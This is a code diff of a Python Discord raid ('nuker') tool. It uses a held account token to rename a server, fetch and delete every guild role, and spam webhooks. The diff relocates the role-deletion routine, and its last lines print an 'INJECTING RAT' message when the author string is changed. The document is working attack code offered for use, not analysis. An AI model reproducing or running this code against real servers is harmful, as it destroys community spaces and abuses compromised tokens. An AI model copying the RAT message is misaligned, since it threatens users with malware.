@@ -144,6 +144,26 @@ async def main():
                         response = requests.patch(f"https://discord.com/api/v9/guilds/{guild}", headers=nwords, json=new_server_name)
                         if response.status_code == 200:   
                             print(Colorate.Color(Colors.green,  f'Server name changed successfully to "{SERVER_NAME}"!',True))        
+headers = nwords
+if DELETE_ROLES == True:
+        async def DELETE_ROLESS():
+            async with aiohttp.ClientSession(headers=headers) as session:
+                async with session.get(f"https://discord.com/api/guilds/{guild}/roles") as response:
+                    if response.status == 200:
+                        roles = await response.json()
+                        Write.Print(f"Successfully retrieved -{len(roles)}- roles\n", Colors.green , interval=0.00000001)
+                        for role in roles:
+                            role_idd = role["id"]
+                            async with session.delete(f"https://discord.com/api/guilds/{guild}/roles/{role_idd}") as delete_response:
+                                if delete_response.status == 204:
+                                    Write.Print(f"[+] Successfully deleted role {role['name']}", Colors.red, interval=0.00000001)
+                                else:
+                                    print(Colorate.Color(Colors.red, f" [!] Failed to delete role {role['name']}.", True))
+                    else:
+                        Write.Print(f" [!] Failed to retrieve roles.", Colors.red, interval=0.00000001)  
+                        
+asyncio.run(DELETE_ROLESS())
+
 
 def spamhookp(hook):
     for i in range(MESSAGES_PER_CHANNEL):
@@ -187,25 +207,7 @@ def spamhook(hook):
             except:
                 Write.Print(f'error spamming! {hook}', Colors.red, interval=0.00000001)
 ####################################################################################
-    headers = nwords
-    if DELETE_ROLES == True:
-        async def DELETE_ROLESS():
-            async with aiohttp.ClientSession(headers=headers) as session:
-                async with session.get(f"https://discord.com/api/guilds/{guild}/roles") as response:
-                    if response.status == 200:
-                        roles = await response.json()
-                        Write.Print(f"Successfully retrieved -{len(roles)}- roles\n", Colors.blue_to_green , interval=0.00000001)
-                        for role in roles:
-                            role_idd = role["id"]
-                            async with session.delete(f"https://discord.com/api/guilds/{guild}/roles/{role_idd}") as delete_response:
-                                if delete_response.status == 204:
-                                    Write.Print(f"[+] Successfully deleted role {role['name']}", Colors.red, interval=0.00000001)
-                                else:
-                                    print(Colorate.Color(Colors.red, f" [!] Failed to delete role {role['name']}.", True))
-                    else:
-                        Write.Print(f" [!] Failed to retrieve roles.", Colors.red, interval=0.00000001)  
-                        await asyncio.gather(DELETE_ROLESS(), main())
-                        asyncio.run(DELETE_ROLESS()) 
+ 
 
 if __author__ != "\x57\x65\x62\x55\x77\x55": # naw
         print(Colors.cyan + 'INJECTING RAT 0/5'),time.sleep(1)
